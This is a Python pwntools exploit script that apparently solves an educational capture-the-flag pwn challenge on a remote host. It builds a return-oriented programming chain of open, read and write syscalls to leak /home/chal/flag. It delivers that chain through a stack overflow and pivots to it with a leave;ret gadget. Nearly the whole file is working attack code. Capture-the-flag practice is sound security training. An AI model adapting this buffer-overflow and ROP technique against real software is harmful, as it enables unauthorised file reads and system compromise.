from pwn import *

context.arch = "amd64"

fn_addr = 0x4e3340
ROP_addr = 0x4e3360

pop_rdi_ret = 0x4038b3
pop_rsi_ret = 0x402428
pop_rdx_rbx_ret = 0x493a2b
pop_rax_ret = 0x45db87
syscall_ret = 0x4284b6
leave_ret = 0x40190c

ROP = flat(
    # fd = open("/home/chal/flag", 0)
    pop_rdi_ret, fn_addr,
    pop_rsi_ret, 0,
    pop_rax_ret, 2,
    syscall_ret,

    # read(fd, fn, 30)
    pop_rdi_ret, 3,
    pop_rsi_ret, fn_addr,
    pop_rdx_rbx_ret, 0x30, 0,
    pop_rax_ret, 0,
    syscall_ret,

    # write(1, fn, 30)
    pop_rdi_ret, 1,
    pop_rax_ret, 1,
    syscall_ret
)

r = remote("edu-ctf.zoolab.org", 10005)

r.sendafter(b"Give me filename: ", b"/home/chal/flag\x00")
r.sendafter(b"Give me ROP: ", b"A" * 0x8 + ROP)
r.sendafter(b"Give me overflow: ", b"A" * 0x20 + p64(ROP_addr) + p64(leave_ret))

r.interactive()
r.close()